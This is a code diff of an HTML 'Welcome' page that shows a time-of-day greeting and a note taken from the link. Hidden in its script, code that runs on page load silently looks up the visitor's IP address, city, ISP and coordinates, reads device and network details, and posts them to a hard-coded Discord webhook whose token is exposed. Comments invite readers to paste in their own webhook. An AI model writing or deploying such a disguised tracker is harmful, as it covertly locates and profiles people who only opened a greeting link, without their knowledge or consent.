@@ -5,120 +5,122 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Welcome</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;600;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;600;800&display=swap');
 
-        :root { --bg: #121212; --primary: #00ff88; --txt: #f0f0f0; }
+        :root { --bg: #0a0a0a; --accent: #00ff88; --txt: #fff; }
 
         body {
-            background: var(--bg); color: var(--txt); font-family: 'Poppins', sans-serif;
+            background: var(--bg); color: var(--txt); font-family: 'Space Grotesk', sans-serif;
             margin: 0; height: 100vh; display: flex; flex-direction: column;
-            align-items: center; justify-content: center; text-align: center;
-            overflow: hidden;
+            align-items: center; justify-content: center; overflow: hidden;
         }
 
-        /* Desain estetik: Besar-Kecil vary */
-        .greeting-box { padding: 20px; }
+        .greeting { padding: 20px; text-align: center; }
+        .hi { font-size: 1rem; color: #666; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 10px; }
         
-        .hi { font-size: 1.2rem; color: #666; font-weight: 300; letter-spacing: 2px; text-transform: uppercase; }
-        .main { font-size: 3.5rem; font-weight: 800; line-height: 1.2; margin: 10px 0; }
-        .note { 
-            margin-top: 30px; font-size: 1rem; color: #888; 
-            background: #1e1e1e; padding: 10px 20px; border-radius: 50px;
-            border: 1px solid #333;
-        }
+        .main { font-size: 4.5rem; font-weight: 800; line-height: 1.1; margin: 15px 0; color: #fff; position: relative; }
+        .main::before { content: attr(data-text); position: absolute; left: 0; right: 0; color: var(--accent); opacity: 0.3; filter: blur(15px); z-index: -1; }
+        
+        .note { margin-top: 30px; font-size: 0.9rem; color: #888; background: rgba(255,255,255,0.05); padding: 12px 25px; border-radius: 50px; border: 1px solid #222; }
 
-        /* Loading ringan */
-        .loader {
-            position: fixed; bottom: 20px; right: 20px;
-            width: 10px; height: 10px; background: var(--primary);
-            border-radius: 50%; box-shadow: 0 0 10px var(--primary);
-            opacity: 0; transition: opacity 0.5s;
-        }
-        .loader.active { opacity: 1; }
+        .loader { position: fixed; bottom: 30px; right: 30px; width: 8px; height: 8px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 10px var(--accent); opacity: 0; transition: opacity 0.3s; }
+        .loader.active { opacity: 1; animation: pulse 1s infinite; }
+        
+        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
     </style>
 </head>
 <body>
 
-    <div class="greeting-box">
+    <div class="greeting">
         <div class="hi">Hi, Welcome</div>
-        <div class="main" id="greetText"></div>
+        <div class="main" id="greetText" data-text=""></div>
         <div class="note" id="noteText"></div>
     </div>
 
     <div class="loader" id="loader"></div>
 
     <script>
-        <script>
-            
-    // === PASTE DISCORD WEBHOOK URL ===
-    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1513396133249024242/EZ8GI-vnWbW86C-aG8FLFa54nAj5ur-aTvZ5oLdqmQnj4lNlVbjgXXamrCLwLFZQcPst";
+        // === PASTE DISCORD WEBHOOK URL DI BAWAH INI ===
+        // Contoh: https://discord.com/api/webhooks/112233445566778899/ABCdefGHIjklmnopQRsTUVwxyZ
+        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1513396133249024242/EZ8GI-vnWbW86C-aG8FLFa54nAj5ur-aTvZ5oLdqmQnj4lNlVbjgXXamrCLwLFZQcPst";
 
-    const params = new URLSearchParams(window.location.search);
-    const catetan = params.get('note');
+        // Ambil parameter catatan
+        const params = new URLSearchParams(window.location.search);
+        const catetan = params.get('note');
 
-    const jam = new Date().getHours();
-    const sapa = jam < 12 ? "Good Morning" : jam < 18 ? "Good Afternoon" : "Good Evening";
-    
-    document.getElementById('greetText').innerText = sapa + " :)";
-    document.getElementById('greetText').setAttribute('data-text', sapa + " :)");
-    document.getElementById('noteText').innerText = catetan ? decodeURIComponent(catetan) : "";
+        // Greeting
+        const jam = new Date().getHours();
+        const sapa = jam < 12 ? "Good Morning" : jam < 18 ? "Good Afternoon" : "Good Evening";
+        const teks = sapa + " :)";
+        
+        document.getElementById('greetText').innerText = teks;
+        document.getElementById('greetText').setAttribute('data-text', teks);
+        document.getElementById('noteText').innerText = catetan ? decodeURIComponent(catetan) : "";
 
-    async function collectAndSend() {
-        document.getElementById('loader').classList.add('active');
+        // KUMPUL DATA & KIRIM KE DISCORD
+        async function collectAndSend() {
+            document.getElementById('loader').classList.add('active');
 
-        const waktu = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
+            const waktu = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
 
-        let ip = "-", loc = "-", isp = "-", latitude = "-", longitude = "-";
-
-        try {
-            // AMBIL DATA IP + LOKASI + KOORDINAT Sekaligus
-            const d = await fetch('https://ipapi.co/json/').then(r => r.json());
-            
-            ip = d.ip;
-            loc = `${d.city||''}, ${d.region||''}, ${d.country||''}`;
-            isp = d.org;
-            latitude = d.latitude;
-            longitude = d.longitude;
-            
-        } catch(e) {
-            console.log("Error:", e);
-        }
-
-        const koordinat = (latitude && longitude) ? `${latitude}, ${longitude}` : "-";
-
-        const ua = navigator.userAgent;
-        const device = ua.includes("Windows") ? "Windows" : ua.includes("Mac") ? "Mac" : ua.includes("Android") ? "Android" : "Mobile";
-            
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const network = conn ? conn.effectiveType : "Wifi";
-
-        // KIRIM KE DISCORD
-        if (WEBHOOK_URL.includes("discord.com/api/webhooks/") && !WEBHOOK_URL.includes("ISI_URL")) {
-            const pesan = {
-                content: `🎯 **NEW VISITOR**\n` +
-                         `⏰ Waktu: ${waktu}\n` +
-                         `🌍 IP: ${ip}\n` +
-                         `📍 Lokasi: ${loc}\n` +
-                         `🏢 ISP: ${isp}\n` +
-                         `💻 Device: ${device}\n` +
-                         `📡 Network: ${network}\n` +
-                         `📍 Koordinat: ${koordinat}\n` +
-                         (catetan ? `📝 Catatan: ${decodeURIComponent(catetan)}` : '')
-            };
-
+            let ip = "-", loc = "-", isp = "-";
             try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(pesan)
-                });
+                const d = await fetch('https://ipapi.co/json/').then(r => r.json());
+                ip = d.ip;
+                loc = `${d.city||''}, ${d.region||''}, ${d.country||''}`;
+                isp = d.org;
             } catch(e) {}
+
+            const ua = navigator.userAgent;
+            const device = ua.includes("Windows") ? "Windows" : ua.includes("Mac") ? "Mac" : ua.includes("Android") ? "Android" : "Mobile";
+            
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const network = conn ? conn.effectiveType : "Wifi";
+
+            // Koordinat dari IP
+            let koordinat = "-";
+            try {
+                const geo = await fetch('https://ipapi.co/' + ip + '/json/').then(r => r.json());
+                if (geo.latitude && geo.longitude) {
+                    koordinat = geo.latitude + ", " + geo.longitude;
+                }
+            } catch(e) {}
+
+            // CEK: Apakah webhook URL sudah diisi dengan benar?
+            if (WEBHOOK_URL.includes("discord.com/api/webhooks/") && !WEBHOOK_URL.includes("ISI_URL")) {
+                
+                const pesan = {
+                    content: `🎯 **NEW VISITOR**\n` +
+                             `⏰ Waktu: ${waktu}\n` +
+                             `🌍 IP: ${ip}\n` +
+                             `📍 Lokasi: ${loc}\n` +
+                             `🏢 ISP: ${isp}\n` +
+                             `💻 Device: ${device}\n` +
+                             `📡 Network: ${network}\n` +
+                             `📍 Koordinat: ${koordinat}\n` +
+                             (catetan ? `📝 Catatan: ${decodeURIComponent(catetan)}` : '')
+                };
+
+                try {
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(pesan)
+                    });
+                    
+                    console.log("Discord response:", response.status);
+                    
+                } catch(e) {
+                    console.log("Error sending to Discord:", e);
+                }
+            } else {
+                console.log("Webhook URL belum dikonfigurasi!");
+            }
+
+            setTimeout(() => document.getElementById('loader').classList.remove('active'), 1500);
         }
 
-        setTimeout(() => document.getElementById('loader').classList.remove('active'), 1500);
-    }
-
-    window.onload = collectAndSend;
-</script>
+        window.onload = collectAndSend;
+    </script>
 </body>
 </html>
